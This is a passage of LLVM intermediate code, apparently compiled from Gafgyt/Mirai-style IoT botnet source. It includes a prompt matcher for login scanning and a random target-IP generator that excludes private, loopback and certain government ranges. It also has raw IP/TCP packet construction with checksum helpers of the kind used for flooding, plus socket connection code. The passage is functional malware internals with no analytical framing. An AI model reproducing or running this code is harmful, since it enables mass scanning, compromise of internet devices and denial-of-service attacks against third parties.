  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getDatIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4, i32 1, i1 false)
  %4 = call i32 @rand() #2
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  br label %20

; <label>:20:                                     ; preds = %249, %0
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %247, label %25

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %247, label %30

; <label>:30:                                     ; preds = %25
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 100
  br i1 %34, label %35, label %45

; <label>:35:                                     ; preds = %30
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp sge i32 %38, 64
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %35
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp sle i32 %43, 127
  br i1 %44, label %247, label %45

; <label>:45:                                     ; preds = %40, %35, %30
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 127
  br i1 %49, label %247, label %50

; <label>:50:                                     ; preds = %45
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 169
  br i1 %54, label %55, label %60

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 254
  br i1 %59, label %247, label %60

; <label>:60:                                     ; preds = %55, %50
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %75

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sle i32 %68, 16
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp sle i32 %73, 31
  br i1 %74, label %247, label %75

; <label>:75:                                     ; preds = %70, %65, %60
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 192
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %75
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %80
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 2
  br i1 %89, label %247, label %90

; <label>:90:                                     ; preds = %85, %80, %75
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 192
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 88
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %95
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %247, label %105

; <label>:105:                                    ; preds = %100, %95, %90
  %106 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %115

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %247, label %115

; <label>:115:                                    ; preds = %110, %105
  %116 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %130

; <label>:120:                                    ; preds = %115
  %121 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %247, label %125

; <label>:125:                                    ; preds = %120
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 19
  br i1 %129, label %247, label %130

; <label>:130:                                    ; preds = %125, %115
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 198
  br i1 %134, label %135, label %145

; <label>:135:                                    ; preds = %130
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %135
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 100
  br i1 %144, label %247, label %145

; <label>:145:                                    ; preds = %140, %135, %130
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 203
  br i1 %149, label %150, label %160

; <label>:150:                                    ; preds = %145
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %150
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 113
  br i1 %159, label %247, label %160

; <label>:160:                                    ; preds = %155, %150, %145
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 62
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %160
  %166 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp sle i32 %168, 30
  br i1 %169, label %247, label %170

; <label>:170:                                    ; preds = %165, %160
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 207
  br i1 %174, label %175, label %185

; <label>:175:                                    ; preds = %170
  %176 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp sge i32 %178, 31
  br i1 %179, label %180, label %185

; <label>:180:                                    ; preds = %175
  %181 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp sle i32 %183, 120
  br i1 %184, label %247, label %185

; <label>:185:                                    ; preds = %180, %175, %170
  %186 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 65
  br i1 %189, label %190, label %200

; <label>:190:                                    ; preds = %185
  %191 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp sge i32 %193, 224
  br i1 %194, label %195, label %200

; <label>:195:                                    ; preds = %190
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp sle i32 %198, 226
  br i1 %199, label %247, label %200

; <label>:200:                                    ; preds = %195, %190, %185
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 195
  br i1 %204, label %205, label %210

; <label>:205:                                    ; preds = %200
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 10
  br i1 %209, label %247, label %210

; <label>:210:                                    ; preds = %205, %200
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 216
  br i1 %214, label %215, label %225

; <label>:215:                                    ; preds = %210
  %216 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 25
  br i1 %219, label %247, label %220

; <label>:220:                                    ; preds = %215
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 94
  br i1 %224, label %247, label %225

; <label>:225:                                    ; preds = %220, %210
  %226 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 212
  br i1 %229, label %230, label %235

; <label>:230:                                    ; preds = %225
  %231 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 56
  br i1 %234, label %247, label %235

; <label>:235:                                    ; preds = %230, %225
  %236 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp sge i32 %238, 224
  br i1 %239, label %240, label %245

; <label>:240:                                    ; preds = %235
  %241 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp sle i32 %243, 239
  br label %245

; <label>:245:                                    ; preds = %240, %235
  %246 = phi i1 [ false, %235 ], [ %244, %240 ]
  br label %247

; <label>:247:                                    ; preds = %245, %230, %220, %215, %205, %195, %180, %165, %155, %140, %125, %120, %110, %100, %85, %70, %55, %45, %40, %25, %20
  %248 = phi i1 [ true, %230 ], [ true, %220 ], [ true, %215 ], [ true, %205 ], [ true, %195 ], [ true, %180 ], [ true, %165 ], [ true, %155 ], [ true, %140 ], [ true, %125 ], [ true, %120 ], [ true, %110 ], [ true, %100 ], [ true, %85 ], [ true, %70 ], [ true, %55 ], [ true, %45 ], [ true, %40 ], [ true, %25 ], [ true, %20 ], [ %246, %245 ]
  br i1 %248, label %249, label %266

; <label>:249:                                    ; preds = %247
  %250 = call i32 @rand() #2
  %251 = srem i32 %250, 255
  %252 = trunc i32 %251 to i8
  %253 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %252, i8* %253, align 1
  %254 = call i32 @rand() #2
  %255 = srem i32 %254, 255
  %256 = trunc i32 %255 to i8
  %257 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %256, i8* %257, align 1
  %258 = call i32 @rand() #2
  %259 = srem i32 %258, 255
  %260 = trunc i32 %259 to i8
  %261 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %260, i8* %261, align 1
  %262 = call i32 @rand() #2
  %263 = srem i32 %262, 255
  %264 = trunc i32 %263 to i8
  %265 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %264, i8* %265, align 1
  br label %20

; <label>:266:                                    ; preds = %247
  %267 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 16, i32 16, i1 false)
  %268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %269 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %268, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i32 0, i32 0), i32 %271, i32 %274, i32 %277, i32 %280) #2
  %282 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %283 = call i32 @inet_addr(i8* %282) #2
  ret i32 %283
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i32
  %14 = load i32, i32* %5, align 4
  %15 = add nsw i32 %14, %13
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = load i32, i32* %5, align 4
  %27 = add nsw i32 %26, %25
  store i32 %27, i32* %5, align 4
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i32, i32* %5, align 4
  %31 = ashr i32 %30, 16
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i32, i32* %5, align 4
  %35 = and i32 %34, 65535
  %36 = load i32, i32* %5, align 4
  %37 = ashr i32 %36, 16
  %38 = add nsw i32 %35, %37
  store i32 %38, i32* %5, align 4
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i32, i32* %5, align 4
  %41 = xor i32 %40, -1
  %42 = trunc i32 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i8* @mygethostbyname(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.addrinfo, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca %struct.addrinfo*, align 8
  %8 = alloca %struct.sockaddr_in*, align 8
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 1
  store i32 2, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = load i8*, i8** %3, align 8
  %14 = call i32 @getaddrinfo(i8* %13, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i32 0, i32 0), %struct.addrinfo* %5, %struct.addrinfo** %6)
  store i32 %14, i32* %9, align 4
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  br label %38

; <label>:17:                                     ; preds = %1
  %18 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  store %struct.addrinfo* %18, %struct.addrinfo** %7, align 8
  br label %19

; <label>:19:                                     ; preds = %32, %17
  %20 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %21 = icmp ne %struct.addrinfo* %20, null
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %19
  %23 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %24 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %23, i32 0, i32 5
  %25 = load %struct.sockaddr*, %struct.sockaddr** %24, align 8
  %26 = bitcast %struct.sockaddr* %25 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %26, %struct.sockaddr_in** %8, align 8
  %27 = load %struct.sockaddr_in*, %struct.sockaddr_in** %8, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %30 = load i32, i32* %29, align 4
  %31 = call i8* @inet_ntoa(i32 %30) #2
  store i8* %31, i8** %2, align 8
  br label %38
                                                  ; No predecessors!
  %33 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %34 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %33, i32 0, i32 7
  %35 = load %struct.addrinfo*, %struct.addrinfo** %34, align 8
  store %struct.addrinfo* %35, %struct.addrinfo** %7, align 8
  br label %19

; <label>:36:                                     ; preds = %19
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  call void @freeaddrinfo(%struct.addrinfo* %37) #2
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %2, align 8
  br label %38

; <label>:38:                                     ; preds = %36, %22, %16
  %39 = load i8*, i8** %2, align 8
  ret i8* %39
}

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %11 = load i8*, i8** %4, align 8
  %12 = call i8* @mygethostbyname(i8* %11)
